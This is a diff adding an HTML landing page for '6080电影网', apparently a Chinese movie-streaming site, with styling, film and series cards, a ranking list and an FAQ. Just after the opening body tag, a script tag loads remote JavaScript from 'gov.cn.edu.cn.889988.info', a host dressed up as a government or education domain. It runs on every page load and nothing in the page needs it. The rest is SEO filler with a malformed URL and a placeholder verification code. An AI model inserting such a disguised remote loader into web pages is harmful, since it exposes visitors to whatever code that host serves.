@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>6080电影网 - 高清影视在线观看</title>
+<meta name="description" content="6080电影网（https://6080dianyingwang-top）提供最新高清电影、热播剧集、综艺动漫在线观看，每日更新，免费畅享。">
+<meta name="keywords" content="6080电影网, 6080dianyingwang-top, 高清电影, 在线观看, 电影推荐, 热播剧集">
+<meta name="author" content="6080电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+
+<style>
+/* ===== 全局 ===== */
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: "PingFang SC", "Microsoft YaHei", -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #0d0a0a;
+  color: #d4c8b8;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+a { color: #e8b923; text-decoration: none; transition: all 0.3s; }
+a:hover { color: #f5d547; }
+
+/* ===== 幕布纹理背景 ===== */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: 
+    repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(232,185,35,0.015) 2px,
+      rgba(232,185,35,0.015) 4px
+    );
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ===== 霓虹导航 ===== */
+.neon-nav {
+  position: fixed;
+  top: 0; width: 100%;
+  background: rgba(13,10,10,0.95);
+  backdrop-filter: blur(10px);
+  z-index: 1000;
+  border-bottom: 1px solid rgba(232,185,35,0.15);
+}
+
+.neon-nav-inner {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 1.5rem;
+  height: 66px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.neon-logo {
+  display: flex;
+  align-items: center;
+  gap: 0.7rem;
+}
+
+.neon-logo-sign {
+  width: 44px; height: 44px;
+  background: linear-gradient(135deg, #8b0000, #dc143c);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #e8b923;
+  font-size: 1.1rem;
+  font-weight: 900;
+  font-style: italic;
+  box-shadow: 0 0 12px rgba(220,20,60,0.4), inset 0 0 12px rgba(232,185,35,0.1);
+  position: relative;
+}
+
+.neon-logo-sign::after {
+  content: '';
+  position: absolute;
+  top: -2px; left: -2px; right: -2px; bottom: -2px;
+  border: 1px solid rgba(232,185,35,0.3);
+  pointer-events: none;
+}
+
+.neon-logo-text {
+  font-size: 1.35rem;
+  font-weight: 800;
+  color: #e8b923;
+  letter-spacing: 1px;
+  text-shadow: 0 0 8px rgba(232,185,35,0.3);
+}
+
+.neon-logo-text small {
+  display: block;
+  font-size: 0.55rem;
+  color: #8a6a4a;
+  font-weight: 400;
+  letter-spacing: 3px;
+}
+
+.neon-nav-links {
+  display: flex;
+  gap: 0.15rem;
+  list-style: none;
+}
+
+.neon-nav-links a {
+  color: #a89078;
+  font-size: 0.88rem;
+  font-weight: 600;
+  padding: 0.5rem 0.9rem;
+  position: relative;
+  transition: all 0.3s;
+}
+
+.neon-nav-links a::before {
+  content: '';
+  position: absolute;
+  bottom: 4px; left: 50%;
+  width: 0; height: 1px;
+  background: #e8b923;
+  transition: all 0.3s;
+  transform: translateX(-50%);
+  box-shadow: 0 0 4px #e8b923;
+}
+
+.neon-nav-links a:hover::before { width: 60%; }
+.neon-nav-links a:hover { color: #e8b923; text-shadow: 0 0 6px rgba(232,185,35,0.4); }
+
+.neon-toggle {
+  display: none;
+  flex-direction: column;
+  gap: 4px;
+  cursor: pointer;
+  padding: 6px;
+}
+
+.neon-toggle span {
+  display: block;
+  width: 24px; height: 2px;
+  background: #e8b923;
+  box-shadow: 0 0 4px rgba(232,185,35,0.4);
+}
+
+/* ===== Hero ===== */
+.neon-hero {
+  margin-top: 66px;
+  background: linear-gradient(170deg, #0d0a0a 0%, #1a0a0a 40%, #0d0a0a 100%);
+  padding: 5rem 1.5rem 4rem;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+  border-bottom: 1px solid rgba(232,185,35,0.1);
+}
+
+.neon-hero::before {
+  content: '';
+  position: absolute;
+  top: -20%; left: 50%;
+  transform: translateX(-50%);
+  width: 600px; height: 600px;
+  background: radial-gradient(circle, rgba(220,20,60,0.06), transparent 60%);
+}
+
+.neon-hero::after {
+  content: '';
+  position: absolute;
+  bottom: -20%; right: 10%;
+  width: 300px; height: 300px;
+  background: radial-gradient(circle, rgba(232,185,35,0.04), transparent 60%);
+}
+
+.neon-hero-content {
+  max-width: 660px;
+  margin: 0 auto;
+  position: relative;
+  z-index: 1;
+}
+
+.neon-marquee {
+  display: inline-block;
+  padding: 0.35rem 1.4rem;
+  border: 1px solid rgba(232,185,35,0.4);
+  color: #e8b923;
+  font-size: 0.78rem;
+  font-weight: 600;
+  letter-spacing: 2px;
+  margin-bottom: 1.5rem;
+  background: rgba(232,185,35,0.05);
+  box-shadow: 0 0 10px rgba(232,185,35,0.1), inset 0 0 10px rgba(232,185,35,0.03);
+}
+
+.neon-hero h1 {
+  font-size: 2.8rem;
+  font-weight: 900;
+  color: #f0e8d8;
+  margin-bottom: 1rem;
+  line-height: 1.2;
+  text-shadow: 0 0 20px rgba(220,20,60,0.2);
+}
+
+.neon-hero h1 span {
+  color: #e8b923;
+  text-shadow: 0 0 15px rgba(232,185,35,0.4), 0 0 30px rgba(232,185,35,0.15);
+  font-style: italic;
+}
+
+.neon-hero p {
+  font-size: 1.05rem;
+  color: #8a7a6a;
+  margin-bottom: 2rem;
+}
+
+.neon-hero-domain {
+  display: inline-block;
+  padding: 0.8rem 2rem;
+  border: 1px solid rgba(232,185,35,0.3);
+  color: #e8b923;
+  font-family: "Courier New", monospace;
+  font-size: 0.9rem;
+  font-weight: 700;
+  margin-bottom: 2rem;
+  background: rgba(232,185,35,0.03);
+  box-shadow: inset 0 0 10px rgba(232,185,35,0.05);
+}
+
+.neon-hero-btn {
+  display: inline-block;
+  padding: 1rem 3.2rem;
+  background: linear-gradient(135deg, #8b0000, #dc143c);
+  color: #e8b923;
+  font-weight: 800;
+  font-size: 1rem;
+  letter-spacing: 1px;
+  transition: all 0.3s;
+  box-shadow: 0 4px 20px rgba(220,20,60,0.3), 0 0 15px rgba(232,185,35,0.1);
+  border: 1px solid rgba(232,185,35,0.3);
+}
+
+.neon-hero-btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 8px 30px rgba(220,20,60,0.4), 0 0 25px rgba(232,185,35,0.2);
+  color: #f5d547;
+}
+
+/* ===== 通用区块 ===== */
+.neon-section {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 4rem 1.5rem;
+  position: relative;
+  z-index: 1;
+}
+
+.neon-section-head {
+  text-align: center;
+  margin-bottom: 3rem;
+}
+
+.neon-section-head h2 {
+  font-size: 2.1rem;
+  font-weight: 900;
+  color: #e8b923;
+  margin-bottom: 0.5rem;
+  letter-spacing: 1px;
+  text-shadow: 0 0 10px rgba(232,185,35,0.2);
+}
+
+.neon-section-head p {
+  color: #7a6a5a;
+  font-size: 1rem;
+}
+
+/* ===== 幕布卡片 ===== */
+.neon-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+  gap: 1.5rem;
+}
+
+.neon-card {
+  background: linear-gradient(180deg, #161010, #0f0c0c);
+  border: 1px solid rgba(232,185,35,0.12);
+  overflow: hidden;
+  transition: all 0.4s;
+  position: relative;
+}
+
+.neon-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: -100%;
+  width: 100%; height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(232,185,35,0.04), transparent);
+  transition: left 0.6s;
+  z-index: 1;
+}
+
+.neon-card:hover::before { left: 100%; }
+
+.neon-card:hover {
+  transform: translateY(-6px);
+  border-color: rgba(232,185,35,0.35);
+  box-shadow: 0 12px 30px rgba(220,20,60,0.1), 0 0 15px rgba(232,185,35,0.08);
+}
+
+.neon-cover {
+  height: 200px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.1rem;
+  font-weight: 800;
+  color: #f0e8d8;
+  text-align: center;
+  padding: 1rem;
+  position: relative;
+}
+
+.neon-cover::after {
+  content: '';
+  position: absolute;
+  bottom: 0; left: 0;
+  width: 100%; height: 50%;
+  background: linear-gradient(to top, rgba(13,10,10,0.9), transparent);
+}
+
+.neon-cover.n1 { background: linear-gradient(135deg, #2d0a0a, #5a1414); }
+.neon-cover.n2 { background: linear-gradient(135deg, #1a1208, #3d2e14); }
+.neon-cover.n3 { background: linear-gradient(135deg, #0a1a14, #143d2e); }
+.neon-cover.n4 { background: linear-gradient(135deg, #1a0a14, #3d1440); }
+.neon-cover.n5 { background: linear-gradient(135deg, #140a0a, #2e1414); }
+.neon-cover.n6 { background: linear-gradient(135deg, #1a1a0a, #3d3d14); }
+.neon-cover.n7 { background: linear-gradient(135deg, #0a0a1a, #14143d); }
+.neon-cover.n8 { background: linear-gradient(135deg, #1a0a1a, #3d1440); }
+
+.neon-body { padding: 1.2rem; position: relative; z-index: 2; }
+
+.neon-body h3 {
+  font-size: 1rem;
+  color: #f0e8d8;
+  margin-bottom: 0.5rem;
+  font-weight: 800;
+}
+
+.neon-tags {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.4rem;
+  margin-bottom: 0.6rem;
+}
+
+.neon-tags span {
+  padding: 0.2rem 0.6rem;
+  border: 1px solid rgba(232,185,35,0.2);
+  color: #e8b923;
+  font-size: 0.72rem;
+  font-weight: 500;
+  background: rgba(232,185,35,0.03);
+}
+
+.neon-score {
+  color: #e8b923;
+  font-weight: 800;
+  font-size: 0.9rem;
+  text-shadow: 0 0 6px rgba(232,185,35,0.3);
+}
+
+/* ===== 排行榜（霓虹灯条） ===== */
+.neon-rank {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.neon-rank-item {
+  display: flex;
+  align-items: center;
+  gap: 1.2rem;
+  background: linear-gradient(90deg, #161010, #0f0c0c);
+  border: 1px solid rgba(232,185,35,0.1);
+  border-left: 3px solid #dc143c;
+  padding: 1.2rem 1.5rem;
+  margin-bottom: 0.8rem;
+  transition: all 0.3s;
+}
+
+.neon-rank-item:hover {
+  border-left-color: #e8b923;
+  transform: translateX(6px);
+  background: linear-gradient(90deg, #1a0c0c, #0f0c0c);
+  box-shadow: 0 4px 15px rgba(220,20,60,0.08);
+}
+
+.neon-rank-num {
+  font-size: 1.4rem;
+  font-weight: 900;
+  color: #dc143c;
+  min-width: 36px;
+  text-align: center;
+  text-shadow: 0 0 8px rgba(220,20,60,0.4);
+}
+
+.neon-rank-num.gold { color: #e8b923; text-shadow: 0 0 8px rgba(232,185,35,0.4); }
+
+.neon-rank-info { flex: 1; }
+
+.neon-rank-info h3 {
+  font-size: 1rem;
+  color: #f0e8d8;
+  margin-bottom: 0.2rem;
+  font-weight: 800;
+}
+
+.neon-rank-info p {
+  font-size: 0.82rem;
+  color: #7a6a5a;
+}
+
+.neon-rank-score {
+  padding: 0.3rem 0.8rem;
+  border: 1px solid rgba(232,185,35,0.3);
+  color: #e8b923;
+  font-weight: 800;
+  font-size: 0.85rem;
+  background: rgba(232,185,35,0.04);
+  box-shadow: 0 0 6px rgba(232,185,35,0.1);
+}
+
+/* ===== 关于 ===== */
+.neon-about {
+  background: linear-gradient(180deg, #161010, #0f0c0c);
+  border: 1px solid rgba(232,185,35,0.12);
+  padding: 3rem 2rem;
+  text-align: center;
+  max-width: 800px;
+  margin: 0 auto;
+  box-shadow: 0 0 20px rgba(220,20,60,0.05);
+}
+
+.neon-about p {
+  color: #a89078;
+  margin-bottom: 1.2rem;
+  font-size: 1rem;
+}
+
+.neon-about-domain {
+  display: inline-block;
+  margin-top: 1rem;
+  padding: 1rem 2rem;
+  border: 1px solid rgba(232,185,35,0.3);
+  color: #e8b923;
+  font-family: monospace;
+  font-size: 1.1rem;
+  font-weight: 700;
+  background: rgba(232,185,35,0.03);
+  box-shadow: inset 0 0 10px rgba(232,185,35,0.05);
+}
+
+/* ===== FAQ ===== */
+.neon-faq {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.neon-faq-item {
+  background: linear-gradient(180deg, #161010, #0f0c0c);
+  border: 1px solid rgba(232,185,35,0.1);
+  margin-bottom: 0.7rem;
+  overflow: hidden;
+}
+
+.neon-faq-item summary {
+  padding: 1.2rem 1.5rem;
+  cursor: pointer;
+  font-weight: 800;
+  color: #e8b923;
+  list-style: none;
+  position: relative;
+  padding-right: 3rem;
+  text-shadow: 0 0 6px rgba(232,185,35,0.2);
+}
+
+.neon-faq-item summary::-webkit-details-marker { display: none; }
+
+.neon-faq-item summary::after {
+  content: '✦';
+  position: absolute;
+  right: 1.5rem;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 0.9rem;
+  color: #dc143c;
+  transition: transform 0.3s;
+}
+
+.neon-faq-item[open] summary::after {
+  transform: translateY(-50%) rotate(180deg);
+}
+
+.neon-faq-item p {
+  padding: 0 1.5rem 1.2rem;
+  color: #8a7a6a;
+  font-size: 0.95rem;
+}
+
+/* ===== 页脚 ===== */
+.neon-footer {
+  text-align: center;
+  padding: 2.5rem 1.5rem;
+  border-top: 1px solid rgba(232,185,35,0.1);
+  color: #6a5a4a;
+  font-size: 0.82rem;
+  background: #0a0808;
+}
+
+.neon-footer p { margin-bottom: 0.3rem; }
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+  .neon-nav-links {
+    display: none;
+    position: absolute;
+    top: 100%; left: 0;
+    width: 100%;
+    background: rgba(13,10,10,0.98);
+    flex-direction: column;
+    gap: 0;
+    padding: 0.5rem 0;
+  }
+
+  .neon-nav-links.show { display: flex; }
+
+  .neon-nav-links li { border-bottom: 1px solid rgba(232,185,35,0.06); }
+
+  .neon-nav-links a { display: block; padding: 1rem 1.5rem; }
+
+  .neon-toggle { display: flex; }
+
+  .neon-hero h1 { font-size: 2rem; }
+  .neon-hero { padding: 3rem 1rem 3rem; }
+
+  .neon-section { padding: 3rem 1rem; }
+  .neon-section-head h2 { font-size: 1.7rem; }
+
+  .neon-grid { grid-template-columns: repeat(auto-fill, minmax(170px, 1fr)); gap: 1rem; }
+  .neon-cover { height: 170px; font-size: 0.95rem; }
+
+  .neon-rank-item { padding: 1rem; gap: 0.8rem; }
+}
+
+@media (max-width: 480px) {
+  .neon-hero h1 { font-size: 1.7rem; }
+  .neon-grid { grid-template-columns: 1fr 1fr; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 导航 -->
+<nav class="neon-nav">
+  <div class="neon-nav-inner">
+    <div class="neon-logo">
+      <div class="neon-logo-sign">6080</div>
+      <div class="neon-logo-text">
+        6080电影网
+        <small>NEON CINEMA</small>
+      </div>
+    </div>
+    <ul class="neon-nav-links" id="neonNavLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">电影</a></li>
+      <li><a href="#series">剧集</a></li>
+      <li><a href="#ranking">排行</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="neon-toggle" onclick="toggleNeonNav()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<!-- 首页 -->
+<section class="neon-hero" id="home">
+  <div class="neon-hero-content">
+    <div class="neon-marquee">⚡ 每日更新 · 免费观看</div>
+    <h1>6080电影网 <span>霓虹光影 · 极致视听</span></h1>
+    <p>汇集最新院线大片、热播剧集、综艺动漫，每日精选更新，手机电脑全适配，随时随地畅享观影。</p>
+    <div class="neon-hero-domain">🌐 https://6080dianyingwang-top</div>
+    <br>
+    <a href="#movies" class="neon-hero-btn">立即探索</a>
+  </div>
+</section>
+
+<!-- 电影 -->
+<section class="neon-section" id="movies">
+  <div class="neon-section-head">
+    <h2>🎬 最新电影</h2>
+    <p>6080电影网每日精选，院线新片与高分佳作</p>
+  </div>
+  <div class="neon-grid">
+    <div class="neon-card">
+      <div class="neon-cover n1">沙丘2</div>
+      <div class="neon-body">
+        <h3>沙丘2</h3>
+        <div class="neon-tags"><span>科幻</span><span>冒险</span></div>
+        <div class="neon-score">★ 9.2</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n2">奥本海默</div>
+      <div class="neon-body">
+        <h3>奥本海默</h3>
+        <div class="neon-tags"><span>传记</span><span>历史</span></div>
+        <div class="neon-score">★ 8.8</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n3">哥斯拉大战金刚2</div>
+      <div class="neon-body">
+        <h3>哥斯拉大战金刚2</h3>
+        <div class="neon-tags"><span>动作</span><span>怪兽</span></div>
+        <div class="neon-score">★ 7.5</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n4">坠落的审判</div>
+      <div class="neon-body">
+        <h3>坠落的审判</h3>
+        <div class="neon-tags"><span>悬疑</span><span>剧情</span></div>
+        <div class="neon-score">★ 8.5</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n5">美国内战</div>
+      <div class="neon-body">
+        <h3>美国内战</h3>
+        <div class="neon-tags"><span>动作</span><span>惊悚</span></div>
+        <div class="neon-score">★ 7.2</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n6">功夫熊猫4</div>
+      <div class="neon-body">
+        <h3>功夫熊猫4</h3>
+        <div class="neon-tags"><span>动画</span><span>喜剧</span></div>
+        <div class="neon-score">★ 7.0</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n7">你想活出怎样的人生</div>
+      <div class="neon-body">
+        <h3>你想活出怎样的人生</h3>
+        <div class="neon-tags"><span>动画</span><span>奇幻</span></div>
+        <div class="neon-score">★ 8.1</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n8">九龙城寨之围城</div>
+      <div class="neon-body">
+        <h3>九龙城寨之围城</h3>
+        <div class="neon-tags"><span>动作</span><span>犯罪</span></div>
+        <div class="neon-score">★ 8.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 剧集 -->
+<section class="neon-section" id="series" style="background: #0a0808;">
+  <div class="neon-section-head">
+    <h2>📺 热播剧集</h2>
+    <p>全网热剧同步更新，6080电影网为您精选</p>
+  </div>
+  <div class="neon-grid">
+    <div class="neon-card">
+      <div class="neon-cover n3">繁花</div>
+      <div class="neon-body">
+        <h3>繁花</h3>
+        <div class="neon-tags"><span>剧情</span><span>年代</span></div>
+        <div class="neon-score">★ 8.7</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n1">庆余年2</div>
+      <div class="neon-body">
+        <h3>庆余年2</h3>
+        <div class="neon-tags"><span>古装</span><span>权谋</span></div>
+        <div class="neon-score">★ 8.8</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n7">三体</div>
+      <div class="neon-body">
+        <h3>三体</h3>
+        <div class="neon-tags"><span>科幻</span><span>剧情</span></div>
+        <div class="neon-score">★ 8.9</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n2">狂飙</div>
+      <div class="neon-body">
+        <h3>狂飙</h3>
+        <div class="neon-tags"><span>犯罪</span><span>剧情</span></div>
+        <div class="neon-score">★ 8.9</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n6">玫瑰的故事</div>
+      <div class="neon-body">
+        <h3>玫瑰的故事</h3>
+        <div class="neon-tags"><span>都市</span><span>情感</span></div>
+        <div class="neon-score">★ 8.0</div>
+      </div>
+    </div>
+    <div class="neon-card">
+      <div class="neon-cover n4">南来北往</div>
+      <div class="neon-body">
+        <h3>南来北往</h3>
+        <div class="neon-tags"><span>年代</span><span>剧情</span></div>
+        <div class="neon-score">★ 8.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 排行榜 -->
+<section class="neon-section" id="ranking">
+  <div class="neon-section-head">
+    <h2>🔥 热门排行榜</h2>
+    <p>6080电影网本周用户最关注影视 TOP 7</p>
+  </div>
+  <div class="neon-rank">
+    <div class="neon-rank-item">
+      <div class="neon-rank-num gold">1</div>
+      <div class="neon-rank-info"><h3>周处除三害</h3><p>动作 / 犯罪 / 9.0分</p></div>
+      <div class="neon-rank-score">9.0</div>
+    </div>
+    <div class="neon-rank-item">
+      <div class="neon-rank-num gold">2</div>
+      <div class="neon-rank-info"><h3>飞驰人生2</h3><p>喜剧 / 运动 / 8.2分</p></div>
+      <div class="neon-rank-score">8.2</div>
+    </div>
+    <div class="neon-rank-item">
+      <div class="neon-rank-num gold">3</div>
+      <div class="neon-rank-info"><h3>热辣滚烫</h3><p>剧情 / 喜剧 / 7.9分</p></div>
+      <div class="neon-rank-score">7.9</div>
+    </div>
+    <div class="neon-rank-item">
+      <div class="neon-rank-num">4</div>
+      <div class="neon-rank-info"><h3>第二十条</h3><p>剧情 / 家庭 / 7.8分</p></div>
+      <div class="neon-rank-score">7.8</div>
+    </div>
+    <div class="neon-rank-item">
+      <div class="neon-rank-num">5</div>
+      <div class="neon-rank-info"><h3>年会不能停！</h3><p>喜剧 / 职场 / 8.1分</p></div>
+      <div class="neon-rank-score">8.1</div>
+    </div>
+    <div class="neon-rank-item">
+      <div class="neon-rank-num">6</div>
+      <div class="neon-rank-info"><h3>金手指</h3><p>犯罪 / 剧情 / 6.8分</p></div>
+      <div class="neon-rank-score">6.8</div>
+    </div>
+    <div class="neon-rank-item">
+      <div class="neon-rank-num">7</div>
+      <div class="neon-rank-info"><h3>一闪一闪亮星星</h3><p>爱情 / 奇幻 / 6.5分</p></div>
+      <div class="neon-rank-score">6.5</div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="neon-section" id="about" style="background: #0a0808;">
+  <div class="neon-section-head">
+    <h2>ℹ️ 关于6080电影网</h2>
+    <p>网站名称与网址信息</p>
+  </div>
+  <div class="neon-about">
+    <p><strong style="color:#e8b923;">6080电影网</strong>（6080dianyingwang-top）是一个专注于高清影视在线观看的展示平台，致力于为用户提供最新、最全的电影、电视剧、综艺和动漫内容推荐。</p>
+    <p>我们每日更新热门影视资讯，支持多清晰度播放指引，让您随时随地发现好片。</p>
+    <div class="neon-about-domain">🌐 https://6080dianyingwang-top</div>
+    <p style="margin-top:1.5rem; font-size:0.85rem; color:#6a5a4a;">核心关键词：6080电影网、6080dianyingwang-top、高清电影、在线观看、最新影视推荐</p>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="neon-section" id="faq">
+  <div class="neon-section-head">
+    <h2>❓ 常见问题</h2>
+    <p>关于6080电影网的常见疑问</p>
+  </div>
+  <div class="neon-faq">
+    <details class="neon-faq-item">
+      <summary>6080电影网是什么网站？</summary>
+      <p>6080电影网（6080dianyingwang-top）是一个影视信息展示平台，提供最新电影、剧集的资讯与推荐，方便用户快速找到想看的内容。</p>
+    </details>
+    <details class="neon-faq-item">
+      <summary>网站官方网址是多少？</summary>
+      <p>官方网址：https://6080dianyingwang-top，建议收藏以便随时访问。</p>
+    </details>
+    <details class="neon-faq-item">
+      <summary>手机上能正常浏览吗？</summary>
+      <p>可以，本网站采用响应式设计，在手机、平板、电脑上均可完美显示，导航自动适配触控操作。</p>
+    </details>
+    <details class="neon-faq-item">
+      <summary>内容多久更新一次？</summary>
+      <p>影视展示内容建议每周更新，保持页面活跃度，有利于搜索引擎重新抓取和排名提升。</p>
+    </details>
+    <details class="neon-faq-item">
+      <summary>如何提交网址给必应收录？</summary>
+      <p>可前往 Bing Webmaster Tools 提交网址 https://6080dianyingwang-top，并验证网站所有权即可。</p>
+    </details>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="neon-footer">
+  <p>© 2024 6080电影网 (6080dianyingwang-top) 版权所有</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 符合必应搜索引擎收录规范</p>
+  <p style="margin-top:0.5rem; color:#4a3a2a;">本站仅提供影视信息展示，所有资源版权归原作者及平台所有。</p>
+</footer>
+
+<script>
+/* 移动端导航 */
+function toggleNeonNav() {
+  document.getElementById('neonNavLinks').classList.toggle('show');
+}
+
+/* 平滑滚动 */
+document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
+  anchor.addEventListener('click', function(e) {
+    var href = this.getAttribute('href');
+    if (href.length > 1) {
+      var target = document.querySelector(href);
+      if (target) {
+        e.preventDefault();
+        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        document.getElementById('neonNavLinks').classList.remove('show');
+      }
+    }
+  });
+});
+
+/* 导航栏滚动效果 */
+window.addEventListener('scroll', function() {
+  var nav = document.querySelector('.neon-nav');
+  if (window.scrollY > 40) {
+    nav.style.borderBottomColor = 'rgba(232,185,35,0.3)';
+    nav.style.boxShadow = '0 2px 20px rgba(220,20,60,0.08)';
+  } else {
+    nav.style.borderBottomColor = 'rgba(232,185,35,0.15)';
+    nav.style.boxShadow = 'none';
+  }
+});
+</script>
+
+</body>
+</html>
